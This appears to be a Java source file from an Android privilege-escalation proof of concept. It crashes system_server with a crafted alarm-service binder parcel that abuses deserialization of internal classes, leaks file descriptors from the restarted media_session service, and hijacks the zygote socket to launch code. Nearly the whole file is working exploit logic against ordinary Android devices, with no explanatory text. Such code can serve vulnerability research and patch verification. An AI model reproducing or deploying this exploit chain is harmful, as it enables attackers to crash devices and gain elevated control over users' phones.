package com.example.thisseemswrong;

import android.content.Context;
import android.os.IBinder;
import android.os.ParcelFileDescriptor;
import android.system.Os;
import android.util.Log;

import java.io.IOException;

public class RebootBackgroundRunner {

    static void start(Context context) throws IOException {
        ProcessBuilder processBuilder = new ProcessBuilder(
                "/system/bin/app_process",
                "/",
                RebootBackgroundRunner.class.getName()
        );
        processBuilder.environment().put("CLASSPATH", context.getApplicationInfo().sourceDir);
        processBuilder.start();
    }

    public static void main(String[] args) throws Exception {
        Log.v(MainActivity.TAG, "Starting");
        Os.setsid();

        Log.v(MainActivity.TAG, "Waiting for new media_session service");
        IBinder origBinder = FdLeaker.getSystemMediaSessionService(), newBinder;
        do {
            Thread.sleep(1);
            newBinder = FdLeaker.getSystemMediaSessionService();
        } while (newBinder == null || newBinder == origBinder);

        Log.v(MainActivity.TAG, "Got new media_session service, creating session instance");
        FdLeaker fdLeaker;
        for (;;) {
            try {
                fdLeaker = new FdLeaker(newBinder);
                break;
            } catch (Exception ignored) {}
            Thread.sleep(1);
        }

        Log.v(MainActivity.TAG, "Starting leak transactions");
        fdLeaker.startLeak(FdLeaker.buildStagedConfig(0, 80, 2));

        Log.v(MainActivity.TAG, "Leakers ready, waiting");
        Thread.sleep(30000);

        Log.v(MainActivity.TAG, "Finishing leak transactions");
        ParcelFileDescriptor[] pfds = fdLeaker.finishLeak(0);
        Log.v(MainActivity.TAG, "Leak transactions finished, got " + pfds.length);
        ParcelFileDescriptor zygoteFd = null;
        for (ParcelFileDescriptor pfd : pfds) {
            Log.v(MainActivity.TAG, "Got fd " + pfd);
            try {
                Log.v(MainActivity.TAG, "readlink /proc//fd=" + Os.readlink("/proc/self/fd/" + pfd.getFd()));
            } catch (Exception e) {}
            try {
                if (GrabZygote.isZygote(pfd)) {
                    zygoteFd = pfd;
                }
            } catch (Exception e) {}
        }

        if (zygoteFd == null) {
            Log.v(MainActivity.TAG, "Didn't find zygote");
            return;
        }

        Log.v(MainActivity.TAG, "Got zygote, sending request");
        GrabZygote.sendRequestToZygote(zygoteFd, Os.getenv("CLASSPATH"));
        Log.v(MainActivity.TAG, "Finished");
    }

    static void crashSystemServer() throws IOException {
        new ProcessBuilder(
                // IAlarmManager.set
                "service", "call", "alarm", "1",
                // String callingPackage
                "i32", "-1",
                // int type
                "i32", "0",
                // long triggerAtTime
                "i64", "0",
                // long windowLength
                "i64", "0",
                // long interval
                "i64", "0",
                // int flags
                "i32", "0",
                // PendingIntent operation == null
                "i32", "0",
                // IAlarmListener listener
                "null",
                // String listenerTag
                "i32", "-1",
                // WorkSource workSource == null
                "i32", "0",
                // AlarmManager.AlarmClockInfo alarmClock != null
                "i32", "1",
                // long mTriggerTime
                "i64", "0",
                // mShowIntent = readParcelable
                "s16", "android.content.pm.PackageParser$Activity",
                // String PackageParser.Component.className = null
                "i32", "-1",
                // String PackageParser.Component.metaData = null
                "i32", "-1",
                // createIntentsList() N=1
                "i32", "1",
                // Class.forName()
                "s16", "android.os.PooledStringWriter",
                // Padding so write goes in-place into read-only preallocated memory
                "i32", "0"
        ).start();
    }

}
